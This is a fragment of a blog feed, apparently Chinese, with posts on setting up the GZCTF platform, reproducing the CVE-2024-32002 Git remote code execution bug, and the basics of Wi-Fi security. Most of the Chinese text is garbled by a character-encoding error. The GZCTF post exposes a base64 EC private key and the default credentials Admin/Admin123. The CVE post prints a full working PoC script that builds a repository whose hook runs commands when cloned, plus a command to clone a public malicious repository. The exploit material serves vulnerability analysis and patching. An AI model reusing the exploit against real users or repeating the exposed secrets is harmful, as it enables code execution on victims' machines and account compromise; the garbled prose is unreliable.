LS0tLS1CRUdJTiBFQyBQUklWQVRFIEtFWS0tLS0tCk1IY0NBUUVFSUVOQUJ1bktoZk5BNzVoUlVrMmF2Y0lHb2xJcXM3Ymp1ckk1aEhRdWNhTEJvQW9HQ0NxR1NNNDkKQXdFSG9VUURRZ0FFY2RnZVhmLzhEYWUvQ00vam5YRzdnTWNLWXBtcnJ5SzJNL0Vna1ptRTB0Z3l0eGxabTl4NQpwanRCYkVPaC84bXBGUE1ZVnkwNUM3QlpJejJqQklqQkh3PT0KLS0tLS1FTkQgRUMgUFJJVkFURSBLRVktLS0tLQo=</span><br></pre></td></tr></table></figure>

<p>é…ç½®å®Œæˆå å¯åŠ¨ gzctf</p>
<p>docker-compose -f  docker-compose.yml up   #å‰å°è¿è¡Œã€-d åå°è¿è¡Œã€‘</p>
<p>docker-compose -f  docker-compose.yml stop  #åœæ­¢</p>
<p>docker-compose -f  docker-compose.yml rm   #åˆ é™¤</p>
<p>Admin/Admin123</p>
<h2 id="é¢˜ç›®é…ç½®"><a href="#é¢˜ç›®é…ç½®" class="headerlink" title="é¢˜ç›®é…ç½®"></a>é¢˜ç›®é…ç½®</h2><p>éƒ¨ç½²web pwn</p>
<p><a href="https://blog.csdn.net/qq_52820087/article/details/127851116">https://blog.csdn.net/qq_52820087/article/details/127851116</a></p>
<p>CTFæœ¬åœ°é¶åœºæ­å»ºâ€”â€”åŸºäºé˜¿é‡Œäº‘ACRå®ç°åŠ¨æ€flagé¢˜å‹çš„åˆ›å»º</p>
<p><a href="https://developer.aliyun.com/article/1526499">https://developer.aliyun.com/article/1526499</a> </p>
<p>å¦‚ä½•ä¼˜é›…çš„ä½¿ç”¨Dockerå‡ºä¸€é“åŠ¨æ€flagçš„CTFé¢˜-GZCTF</p>
<p><a href="https://sj1t.cn/2024/01/04/%E5%8A%A8%E6%80%81Flag%E5%AE%9E%E7%8E%B0/">https://sj1t.cn/2024/01/04/%E5%8A%A8%E6%80%81Flag%E5%AE%9E%E7%8E%B0/</a></p>
<p>åœ¨k3s masterä¸­ æ„å»ºé¢˜ç›® ç„¶åä¸Šç©¿åˆ°dockerä¸­   å…·ä½“æ–¹æ³•å‚è€ƒ<a href="https://blog.csdn.net/qq_52820087/article/details/127851116">https://blog.csdn.net/qq_52820087/article/details/127851116</a></p>
<p>ç›®å‰å­˜åœ¨é—®é¢˜  é…ç½®çš„ä¸º k3sä¸»çš„ip  ç„¶åç”Ÿæˆçš„ä¸º ä¸»çš„ip ä½†æ˜¯å®é™…ä¸Šå¼€çš„æ‰€ slaveæœºå™¨çš„</p>
<h2 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h2><p>GZCTFéšè—ç§¯åˆ†æ¦œè®°å½• <a href="https://www.zhaoj.in/read-8947.html">https://www.zhaoj.in/read-8947.html</a></p>
<p>GZCTFå¹³å°å¯¹æ¥QQæœºå™¨äºº <a href="https://www.cnblogs.com/Joooook/p/18152428">https://www.cnblogs.com/Joooook/p/18152428</a></p>
<p><a href="https://github.com/CTF-Archives/GZCTFBOT">https://github.com/CTF-Archives/GZCTFBOT</a></p>
<hr>
<h2 id="å¼€å¯æµé‡æ•è·"><a href="#å¼€å¯æµé‡æ•è·" class="headerlink" title="å¼€å¯æµé‡æ•è·"></a>å¼€å¯æµé‡æ•è·</h2><p>æ•è·é˜Ÿä¼è§£é¢˜æµé‡ éœ€å¼€å¯å¹³å°ä»£ç†</p>
<p>å¹³å°ä»£ç†é…ç½®  <a href="https://docs.ctf.gzti.me/zh/guide/platform-proxy">https://docs.ctf.gzti.me/zh/guide/platform-proxy</a></p>
<p>åœ¨ appsettings.json ä¸­ï¼Œæ‰¾åˆ° ContainerProvider èŠ‚ç‚¹ï¼Œè¿›è¡Œå¦‚ä¸‹é…ç½®ï¼š</p>
<p>{  â€œContainerProviderâ€: {    â€œPortMappingTypeâ€: â€œPlatformProxyâ€,    â€œEnableTrafficCaptureâ€: false  } }</p>
<p>ç„¶åä½¿ç”¨ websocketè¿›è¡Œè¿æ¥</p>
]]></content>
  </entry>
  <entry>
    <title>CVE-2024-32002_Gitè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åˆ†æ</title>
    <url>/posts/6d847069/</url>
    <content><![CDATA[<h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><ul>
<li><p>åœ¨å¼€å‘é¡¹ç›®ä¸­å¦‚æœéœ€è¦æƒ³è®²ä¸¤ä¸ªé¡¹ç›®ä½œä¸ºç‹¬ç«‹é¡¹ç›®ï¼Œåˆæƒ³åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­å»ä½¿ç”¨å¦ä¸€ä¸ªé¡¹ç›®ï¼Œå¯é€šè¿‡gitçš„å­æ¨¡å—æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚git çš„å­æ¨¡å—å…è®¸ä½¿ç”¨ä¸€ä¸ªé¡¹ç›®çš„gitä»“åº“æ—¶å»é€’å½’å¼•ç”¨å¦ä¸€ä¸ªé¡¹ç›®gitä»“åº“çš„å­ç›®å½•ã€‚  ä¸€èˆ¬é€šè¿‡ git submoduleå‘½ä»¤è¿›è¡Œæ“ä½œ ã€‚</p>
</li>
<li><p>post-checkoutæ–‡ä»¶æ˜¯Gitä¸­çš„ä¸€ç§é’©å­ï¼Œåœ¨è¿è¡Œgit cloneæˆ–git checkoutå‘½ä»¤åå°†ä¼šè¢«è°ƒç”¨ã€‚</p>
</li>
<li><p>åœ¨Windowså’ŒMacç³»ç»Ÿä¸­ ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥åœ¨åˆ›å»ºæ–‡ä»¶ç›®å½•æ—¶åˆ›å»ºä¸€ä¸ª AA çš„ç›®å½•åå°†æ— æ³•åˆ›å»ºä¸€ä¸ªåä¸º aa çš„ç›®å½•ã€‚ã€è¿™ä¸ªå¹¶æ²¡æœ‰åœ¨åˆ†ææ—¶ä½“ç°å‡ºæ¥ï¼Œæ²¡æœ‰ç›¸å…³ä»£ç å¯ä¾›åˆ†æï¼ŒPOCæ˜¯é€šè¿‡ä¿®å¤ä»£ç ä¸­çš„æµ‹è¯•è„šæœ¬æ–‡ä»¶å»å®ç°çš„ã€‘</p>
<p><img src="/posts/6d847069/image-20240521180326713.png"></p>
</li>
</ul>
<h3 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h3><p>  Gitæ˜¯ä¸€æ¬¾å…è´¹å¼€æºçš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œæ”¯æŒåœ¨å¤šä¸ªç³»ç»Ÿä¸­å®‰è£…è¿è¡Œï¼Œå¹¿æ³›ç”¨äºåä½œå¼€å‘å’Œç®¡ç†è½¯ä»¶é¡¹ç›®ã€‚åœ¨gitä¸­æä¾›äº†è®¸å¤šåŠŸèƒ½ï¼Œæ¯”å¦‚å­æ¨¡å—ã€é’©å­ç­‰ï¼Œä½¿å¾—gitåœ¨ä½¿ç”¨æ—¶å˜å¾—æ›´ä¸ºçµæ´»ã€‚</p>
<p>  åœ¨å¼€å‘é¡¹ç›®ä¸­å¦‚æœéœ€è¦æƒ³è®²ä¸¤ä¸ªé¡¹ç›®ä½œä¸ºç‹¬ç«‹é¡¹ç›®ï¼Œåˆæƒ³åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­å»ä½¿ç”¨å¦ä¸€ä¸ªé¡¹ç›®ï¼Œå¯é€šè¿‡gitçš„å­æ¨¡å—æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚git çš„å­æ¨¡å—å…è®¸ä½¿ç”¨ä¸€ä¸ªé¡¹ç›®çš„gitä»“åº“æ—¶å»é€’å½’å¼•ç”¨å¦ä¸€ä¸ªé¡¹ç›®gitä»“åº“çš„å­ç›®å½•ã€‚  ä¸€èˆ¬é€šè¿‡ git submoduleå‘½ä»¤è¿›è¡Œæ·»åŠ å­æ¨¡å— ã€‚</p>
<p>  åœ¨ä½¿ç”¨git clone å‘½ä»¤æ—¶ï¼Œ ä¼šæ ¹æ®.gitmodulesæ–‡ä»¶è‡ªåŠ¨å…‹éš†hookçš„å­æ¨¡å—ï¼Œå­æ¨¡å—ä¸­çš„post-checkouté’©å­ä¼šè¢«è§¦å‘ã€‚æœªç»èº«ä»½è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…åˆ›å»ºå¸¦æœ‰ç‰¹æ®Šå­æ¨¡å—å’Œç¬¦å·é“¾æ¥çš„æ¶æ„å­˜å‚¨åº“ï¼Œå½“å—å®³è€…åœ¨git cloneæ—¶å°†ä¼šè§¦å‘æ¶æ„è„šæœ¬ï¼Œä»è€Œé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè¯¥æ¼æ´å¯è¢«ç”¨äºé’“é±¼æˆ–å·æ¯’ï¼Œä½†åœ¨Windowsä¸­çš„åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰ã€‚</p>
<h3 id="æ¼æ´å½±å“"><a href="#æ¼æ´å½±å“" class="headerlink" title="æ¼æ´å½±å“"></a>æ¼æ´å½±å“</h3><p>ä»…å½±å“Windowså’ŒMACç³»ç»Ÿä¸‹å¦‚ä¸‹ç‰ˆæœ¬ï¼š</p>
<p>git 2.45.0</p>
<p>git 2.44.0</p>
<p>git 2.43.* &lt; 2.43.4</p>
<p>git 2.42.* &lt; 2.42.2</p>
<p>git 2.41.0</p>
<p>git 2.40.* &lt; 2.40.2</p>
<p>git &lt; 2.39.4</p>
<h3 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h3><p>åœ°å€ï¼š<a href="https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d">https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d</a></p>
<p>åœ¨è¡¥ä¸æ›´æ–°ä¸­ ä¸»è¦å˜æ›´äº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶è¡¥ä¸ï¼Œå¦ä¸€ä¸ªåˆ™ä¸ºæµ‹è¯•è„šæœ¬ã€‚</p>
<p><img src="/posts/6d847069/image-20240521180423440.png"></p>
<p><img src="/posts/6d847069/image-20240521180629016.png"></p>
<p>åœ¨clone_submoduleä¸­æ·»åŠ äº†å…‹éš†å‰è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœå­æ¨¡å—ç›®å½•æ˜¯å¦å­˜åœ¨ä¸”ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºåˆ™ä¼šç»ˆæ­¢ã€‚</p>
<p>æ–°åŠ äº†ä¸€ä¸ª dir_contains_only_dotgit()å‡½æ•°ï¼Œä¸»è¦ä½œç”¨ä¸º æ£€æŸ¥ç›®å½•æ˜¯å¦ä»…åŒ…å« .gitæ–‡ä»¶åç›®å½•ï¼Œå¦‚æœå­˜åœ¨å…¶ä»–æ–‡ä»¶æˆ–ç›®å½•åˆ™è¿”å›é”™è¯¯ã€‚</p>
<p>ç¬¬äºŒä¸ªæ–‡ä»¶æ›´æ–°åˆ™ä¸ºæµ‹è¯•è„šæœ¬</p>
<p>åœ¨hookå­ç›®å½•ä¸­çš„post-checkouté’©å­ä¸­å†™å…¥å‘½ä»¤ï¼Œç„¶åå°†å¸¦æœ‰post-chechouté’©å­çš„hookä»“åº“ä½œä¸ºå­æ¨¡å—æ·»åŠ åˆ°captiainä»“åº“ä¸­ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test_expect_success CASE_INSENSITIVE_FS,SYMLINKS \</span><br><span class="line">    &#x27;submodule paths must not follow symlinks&#x27; &#x27;</span><br><span class="line">    # This is only needed because we want to run this in a self-contained</span><br><span class="line">    # test without having to spin up an HTTP server; However, it would not</span><br><span class="line">    # be needed in a real-world scenario where the submodule is simply</span><br><span class="line">    # hosted on a public site.</span><br><span class="line">    test_config_global protocol.file.allow always &amp;&amp;</span><br><span class="line">    # Make sure that Git tries to use symlinks on Windows</span><br><span class="line">    test_config_global core.symlinks true &amp;&amp;</span><br><span class="line">    tell_tale_path=&quot;$PWD/tell.tale&quot; &amp;&amp;</span><br><span class="line">    git init hook &amp;&amp;</span><br><span class="line">    (</span><br><span class="line">        cd hook &amp;&amp;</span><br><span class="line">        mkdir -p y/hooks &amp;&amp;</span><br><span class="line">        write_script y/hooks/post-checkout &lt;&lt;-EOF &amp;&amp;</span><br><span class="line">        echo HOOK-RUN &gt;&amp;2</span><br><span class="line">        echo hook-run &gt;&quot;$tell_tale_path&quot;</span><br><span class="line">        EOF</span><br><span class="line">        git add y/hooks/post-checkout &amp;&amp;</span><br><span class="line">        test_tick &amp;&amp;</span><br><span class="line">        git commit -m post-checkout</span><br><span class="line">    ) &amp;&amp;</span><br><span class="line">    hook_repo_path=&quot;$(pwd)/hook&quot; &amp;&amp;</span><br><span class="line">    git init captain &amp;&amp;</span><br><span class="line">    (</span><br><span class="line">        cd captain &amp;&amp;</span><br><span class="line">        git submodule add --name x/y &quot;$hook_repo_path&quot; A/modules/x &amp;&amp;</span><br><span class="line">        test_tick &amp;&amp;</span><br><span class="line">        git commit -m add-submodule &amp;&amp;</span><br><span class="line">        printf .git &gt;dotgit.txt &amp;&amp;</span><br><span class="line">        git hash-object -w --stdin &lt;dotgit.txt &gt;dot-git.hash &amp;&amp;</span><br><span class="line">        printf &quot;120000 %s 0\ta\n&quot; &quot;$(cat dot-git.hash)&quot; &gt;index.info &amp;&amp;</span><br><span class="line">        git update-index --index-info &lt;index.info &amp;&amp;</span><br><span class="line">        test_tick &amp;&amp;</span><br><span class="line">        git commit -m add-symlink</span><br><span class="line">    ) &amp;&amp;</span><br><span class="line">    test_path_is_missing &quot;$tell_tale_path&quot; &amp;&amp;</span><br><span class="line">    test_must_fail git clone --recursive captain hooked 2&gt;err &amp;&amp;</span><br><span class="line">    grep &quot;directory not empty&quot; err &amp;&amp;</span><br><span class="line">    test_path_is_missing &quot;$tell_tale_path&quot;</span><br><span class="line">&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p><img src="/posts/6d847069/image-20240521180803937.png"></p>
<p>Windowsä¸‹åœ¨ç®¡ç†å‘˜æƒé™ä¸‹é€šè¿‡Git Bashå¯å¤ç°æ­¤æ¼æ´ã€éœ€è¦ç®¡ç†å‘˜æƒé™ï¼ã€‘</p>
<p><img src="/posts/6d847069/image-20240521180819704.png"></p>
<p>POCæ¥æºï¼š<a href="https://github.com/amalmurali47/git_rce">https://github.com/amalmurali47/git_rce</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># Set Git configuration options</span><br><span class="line"></span><br><span class="line"># å…è®¸ä½¿ç”¨fileåè®®</span><br><span class="line">git config --global protocol.file.allow always</span><br><span class="line"># å¯ç”¨å¯¹ç¬¦åˆé“¾æ¥çš„æ”¯æŒ</span><br><span class="line">git config --global core.symlinks true</span><br><span class="line"># optional, but I added it to avoid the warning message</span><br><span class="line"># è®¾ç½®é»˜è®¤åˆ†æ”¯å main é¿å…å‡ºç°å‘Šè­¦ä¿¡æ¯</span><br><span class="line">git config --global init.defaultBranch main </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># å®šä¹‰æ ‡å¿—æ–‡ä»¶è·¯å¾„</span><br><span class="line"># Define the tell-tale path</span><br><span class="line">tell_tale_path=&quot;$PWD/tell.tale&quot;</span><br><span class="line"></span><br><span class="line"># åˆå§‹åŒ–hookä»“åº“</span><br><span class="line"># Initialize the hook repository</span><br><span class="line">git init hook</span><br><span class="line">cd hook</span><br><span class="line">mkdir -p y/hooks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ç¼–å†™æ¶æ„hookä»£ç </span><br><span class="line"># Write the malicious code to a hook</span><br><span class="line">cat &gt; y/hooks/post-checkout &lt;&lt;EOF</span><br><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;amal_was_here&quot; &gt; /tmp/pwnd</span><br><span class="line">calc.exe</span><br><span class="line">open -a Calculator.app</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"># è®¾ç½®hookæ–‡ä»¶çš„å¯æ‰§è¡Œæƒé™</span><br><span class="line"># Make the hook executable: important</span><br><span class="line">chmod +x y/hooks/post-checkout</span><br><span class="line"></span><br><span class="line"># æ·»åŠ å¹¶æäº¤hook</span><br><span class="line">git add y/hooks/post-checkout</span><br><span class="line">git commit -m &quot;post-checkout&quot;</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line"># å®šä¹‰hookä»“åº“è·¯å¾„</span><br><span class="line"># Define the hook repository path</span><br><span class="line">hook_repo_path=&quot;$(pwd)/hook&quot;</span><br><span class="line"></span><br><span class="line"># åˆå§‹åŒ–captainä»“åº“</span><br><span class="line"># Initialize the captain repository</span><br><span class="line">git init captain</span><br><span class="line">cd captain</span><br><span class="line"></span><br><span class="line"># æ·»åŠ  hookä»“åº“ä½œä¸º å­æ¨¡å— è·¯å¾„ä¸º A/modulesx åç§°ä¸º x/y</span><br><span class="line">git submodule add --name x/y &quot;$hook_repo_path&quot; A/modules/x</span><br><span class="line"># æäº¤å­æ¨¡å—æ›´æ”¹</span><br><span class="line">git commit -m &quot;add-submodule&quot;</span><br><span class="line"></span><br><span class="line"># Create a symlink</span><br><span class="line"># åˆ›å»ºç¬¦åˆé“¾æ¥</span><br><span class="line">printf &quot;.git&quot; &gt; dotgit.txt</span><br><span class="line"># è®¡ç®—æ–‡ä»¶çš„å“ˆå¸Œå€¼</span><br><span class="line">git hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hash</span><br><span class="line"># å‡†å¤‡ç´¢å¼•ä¿¡æ¯</span><br><span class="line">printf &quot;120000 %s 0\ta\n&quot; &quot;$(cat dot-git.hash)&quot; &gt; index.info</span><br><span class="line"># æ›´æ–°gitç´¢å¼•</span><br><span class="line">git update-index --index-info &lt; index.info</span><br><span class="line"># æäº¤æ›´æ”¹</span><br><span class="line">git commit -m &quot;add-symlink&quot;</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line"># å…‹éš†ä»“åº“</span><br><span class="line">git clone --recursive captain hooked</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œ<code>git clone --recursive git@github.com:10cks/captain.git</code> å³å¯è¿œç¨‹å¤ç°æ­¤æ¼æ´</p>
<p><img src="/posts/6d847069/image-20240521180925512.png"></p>
<h3 id="ä¿®å¤æªæ–½"><a href="#ä¿®å¤æªæ–½" class="headerlink" title="ä¿®å¤æªæ–½"></a>ä¿®å¤æªæ–½</h3><h4 id="å‡çº§ç‰ˆæœ¬"><a href="#å‡çº§ç‰ˆæœ¬" class="headerlink" title="å‡çº§ç‰ˆæœ¬"></a>å‡çº§ç‰ˆæœ¬</h4><p>ç›®å‰å®˜æ–¹å·²æœ‰å¯æ›´æ–°ç‰ˆæœ¬ï¼Œå»ºè®®å—å½±å“ç”¨æˆ·å‡çº§è‡³æœ€æ–°ç‰ˆæœ¬ï¼š</p>
<p>git 2.45.* &gt;= 2.45.1</p>
<p>git 2.44.* &gt;= 2.44.1</p>
<p>git 2.43.* &gt;= 2.43.4</p>
<p>git 2.42.* &gt;= 2.42.2</p>
<p>git 2.41.* &gt;= 2.41.1</p>
<p>git 2.40.* &gt;= 2.40.2</p>
<p>git &gt;= 2.39.4</p>
<p>ä¸‹è½½åœ°å€ï¼š</p>
<p><a href="https://github.com/git/git/tags">https://github.com/git/git/tags</a></p>
<h4 id="ç¼“è§£æ–¹æ¡ˆ"><a href="#ç¼“è§£æ–¹æ¡ˆ" class="headerlink" title="ç¼“è§£æ–¹æ¡ˆ"></a>ç¼“è§£æ–¹æ¡ˆ</h4><p>1.åœ¨Gitä¸­ç¦ç”¨ç¬¦å·é“¾æ¥ï¼ˆ<code> git config --global core.symlinks false</code>ï¼‰</p>
<p>2.é¿å…åœ¨ä¸å—ä¿¡ä»»çš„æ¥æºå…‹éš†å­˜å‚¨åº“</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://amalmurali.me/posts/git-rce/">https://amalmurali.me/posts/git-rce/</a></p>
<p><a href="https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d">https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d</a></p>
<p><a href="https://github.com/amalmurali47/git_rce">https://github.com/amalmurali47/git_rce</a></p>
<p><a href="https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90">https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90</a></p>
]]></content>
  </entry>
  <entry>
    <title>æµ…æWi-Fiå®‰å…¨</title>
    <url>/posts/ae3c8023/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æ— çº¿å®‰å…¨åº”ç”¨æ— æ‰€ä¸åœ¨ï¼Œä¼ä¸šå’Œä¸ªäººåœ¨ä½¿ç”¨å¼€æ”¾çš„æ— çº¿ç½‘ç»œæ—¶ï¼Œè™½ç„¶çŸ¥é“å­˜åœ¨å®‰å…¨é£é™©ï¼Œä½†ä»ç„¶ä¾èµ–äºè¿™ç§ç½‘ç»œæ¨¡å¼ã€‚ä¸ºäº†ä¿æŠ¤ç”¨æˆ·ã€è®¾å¤‡å’ŒæœåŠ¡ç³»ç»Ÿçš„å®‰å…¨ï¼Œä¼ä¸šå®‰å…¨å›¢é˜Ÿå¿…é¡»é‡è§†æ— çº¿ç½‘ç»œçš„å®‰å…¨æ€§ã€‚äº†è§£å¯èƒ½å‡ºç°çš„æ— çº¿ç½‘ç»œæ”»å‡»ç±»å‹ä»¥åŠé‡‡å–é€‚å½“çš„ä¿æŠ¤æªæ–½è‡³å…³é‡è¦ã€‚æœ¬ç¯‡å°†ç®€æä¸‹Wifiå®‰å…¨çš„å¸¸è§æ”»å‡»æ‰‹æ³•ã€‚</p>
<h3 id="IEEE-802-11"><a href="#IEEE-802-11" class="headerlink" title="IEEE 802.11"></a>IEEE 802.11</h3><p>802.11 ä½“ç³»ç»“æ„åŒ…æ‹¬å‡ ç±»ä¸»è¦ç»„ä»¶ï¼Œ AP(Access Pointï¼Œæ— çº¿æ¥å…¥ç‚¹)ã€STA(Stationï¼Œç«™)ã€IBSSã€BSSã€DSã€ESSã€‚</p>
<p>802.11æ ‡å‡†å°†æ‰€æœ‰æ•°æ®åŒ…åˆ†ä¸º3ç§ï¼šæ•°æ®ã€ç®¡ç†ã€æ§åˆ¶</p>
<ul>
<li>æ•°æ®å¸§ï¼šç”¨äºä¼ è¾“ç”¨æˆ·æ•°æ®ï¼Œå¦‚æ–‡ä»¶ã€è§†é¢‘æˆ–éŸ³é¢‘ç­‰ã€‚</li>
<li>ç®¡ç†å¸§ï¼šç”¨äºç®¡ç†å’Œç»´æŠ¤ç½‘ç»œï¼Œæ‰§è¡Œè¯¸å¦‚æ‰«æã€è¿æ¥å’Œèº«ä»½éªŒè¯ç­‰åŠŸèƒ½ã€‚</li>
<li>æ§åˆ¶å¸§ï¼šç”¨äºæ§åˆ¶æ•°æ®ä¼ è¾“è¿‡ç¨‹ï¼ŒåŒ…æ‹¬ç®¡ç†æ•°æ®ä¼ è¾“é€Ÿç‡å’ŒæµåŠ¨ï¼Œä»¥åŠå¤„ç†ç¢°æ’ç­‰ã€‚</li>
</ul>
<h4 id="åè®®æ ‡å‡†"><a href="#åè®®æ ‡å‡†" class="headerlink" title="åè®®æ ‡å‡†"></a>åè®®æ ‡å‡†</h4><p>åœ¨802.11æ ‡å‡†ä¸­æœ‰å¤šç§ä¸åŒçš„è§„èŒƒï¼Œæ¯ç§è§„èŒƒéƒ½æä¾›ä¸åŒçš„æ•°æ®ä¼ è¾“é€Ÿç‡ã€é¢‘ç‡èŒƒå›´å’Œå®‰å…¨ç‰¹æ€§ã€‚802.11æ ‡å‡†å·²æˆä¸ºæœ€ä¸ºå¹¿æ³›çš„WLANæŠ€æœ¯ï¼Œå¹¶å¾—åˆ°äº†å„ç§è®¾å¤‡çš„å¹¿æ³›æ”¯æŒã€‚</p>
<ul>
<li>Wi-Fi 1 = IEEE 802.11bï¼šæ”¯æŒ2.4GHzé¢‘æ®µçš„æ— çº¿å±€åŸŸç½‘åè®®ï¼Œæœ€é«˜é€Ÿç‡ä¸º11 Mbpsã€‚</li>
<li>Wi-Fi 2 = IEEE 802.11aï¼šæ”¯æŒ5GHzé¢‘æ®µçš„æ— çº¿å±€åŸŸç½‘åè®®ï¼Œæœ€é«˜é€Ÿç‡ä¸º54 Mbpsã€‚</li>
<li>Wi-Fi 3 = IEEE 802.11gï¼šæ”¯æŒ2.4GHzé¢‘æ®µçš„æ— çº¿å±€åŸŸç½‘åè®®ï¼Œæœ€é«˜é€Ÿç‡ä¸º54 Mbpsã€‚</li>
<li>Wi-Fi 4 = IEEE 802.11nï¼šæ”¯æŒ2.4GHzå’Œ5GHzé¢‘æ®µçš„æ— çº¿å±€åŸŸç½‘åè®®ï¼Œæœ€é«˜é€Ÿç‡ä¸º600 Mbpsã€‚</li>
<li>Wi-Fi 5 = IEEE 802.11acï¼šæ”¯æŒ5GHzé¢‘æ®µçš„æ— çº¿å±€åŸŸç½‘åè®®ï¼Œæœ€é«˜é€Ÿç‡å¯è¾¾1.3 Gbpsã€‚</li>
<li>Wi-Fi 6 = IEEE 802.11axï¼šæ”¯æŒ2.4GHzå’Œ5GHzé¢‘æ®µçš„æ— çº¿å±€åŸŸç½‘åè®®ï¼Œæœ€é«˜é€Ÿç‡å¯è¾¾10 Gbpsã€‚</li>
</ul>
<p>2.4GHzä¸5GHzé¢‘æ®µä¼˜ç¼ºç‚¹å¯¹æ¯”å¦‚ä¸‹ï¼š</p>
<p><img src="/posts/ae3c8023/1.png"></p>
<p>åœ¨802.11b 802.11g 802.11næ ‡å‡†ä¸­ï¼Œ2.4GHzé¢‘æ®µè¢«åˆ’åˆ†ä¸º14ä¸ªä¿¡é“ï¼Œ1~13ä¿¡é“æ— éœ€ç”³è¯·å¯ä»¥éšæ„ä½¿ç”¨ã€‚</p>
<p>æ¯ä¸ªä¿¡é“çš„æœ‰æ•ˆå¸¦å®½ä¸º20MHzã€å®é™…å¸¦å®½22MHzï¼Œå…¶ä¸­2MHzä¸ºéš”ç¦»é¢‘å¸¦ã€‘ï¼Œç›¸é‚»ä¿¡é“çš„ä¸­å¿ƒé¢‘ç‚¹é—´éš”ä¸º5MHzï¼Œå› æ­¤åœ¨å¤šä¸ªä¿¡é“ä¹‹é—´ä¼šå­˜åœ¨é‡å çš„é¢‘ç‡ã€‚</p>
<p>å¹²æ‰°æœ€å°çš„æ–°çš„æœ‰3ç»„ï¼Œå¯åŒä¸‹å›¾çœ‹å‡ºï¼ˆ1ã€6ã€11  å’Œ  2ã€7ã€12 å’Œ 3ã€8ã€13ï¼‰</p>
<p>å›¾è‡ª ã€Šé»‘å®¢å¤§æ­ç§˜ï¼šè¿‘æºæ¸—é€æµ‹è¯•ã€‹</p>
<p><img src="/posts/ae3c8023/2.png"></p>
<h3 id="802-11-åŠ å¯†ç³»ç»Ÿ"><a href="#802-11-åŠ å¯†ç³»ç»Ÿ" class="headerlink" title="802.11 åŠ å¯†ç³»ç»Ÿ"></a>802.11 åŠ å¯†ç³»ç»Ÿ</h3><p>æ— çº¿ç½‘ç»œçš„å®‰å…¨åè®®é€šå¸¸åŒ…æ‹¬ WEPã€WPAã€WPA2ã€WPA3ï¼Œå…¶ä¸­è¾ƒä¸ºå®‰å…¨çš„æ˜¯WPA2å’ŒWPA3ã€‚ä½¿ç”¨WPA2/WPA3åŠ å¯†å¯ä»¥ç¡®ä¿æ•°æ®ä¼ è¾“çš„å®‰å…¨æ€§ï¼Œé¿å…è¢«æ”»å‡»è€…çªƒå–æˆ–ç¯¡æ”¹ã€‚åŒæ—¶åœ¨ä½¿ç”¨æ—¶ï¼Œå»ºè®®ä½¿ç”¨é«˜å¼ºåº¦å¯†ç ä»¥å¢åŠ è¢«ç ´è§£çš„éš¾åº¦ã€‚</p>
<h4 id="WEP"><a href="#WEP" class="headerlink" title="WEP"></a>WEP</h4><p>å…¨ç§°æ˜¯ Wired Equivalent Privacyï¼Œæœ‰çº¿ç­‰æ•ˆä¿å¯†ã€‚WEPçš„æ ¸å¿ƒé‡‡ç”¨RC4åŠ å¯†ï¼ŒåŠ å¯†å¯†é’¥é•¿åº¦æœ‰64ä½ã€128ä½å’Œ152ä½ã€‚</p>
<p>å…¶ä¸­æœ‰24bitçš„IVåç§»å‘é‡ï¼Œæœ‰æ•ˆå¯†é’¥é•¿åº¦ä¸º40ä½ã€104ä½ã€128ä½ã€‚IVä½äºæ¯ä¸ª802.11å¸§å¤´éƒ¨çš„å­—æ®µï¼Œåœ¨åŠ è§£å¯†è¿‡ç¨‹ä¸­ä½¿ç”¨ã€‚</p>
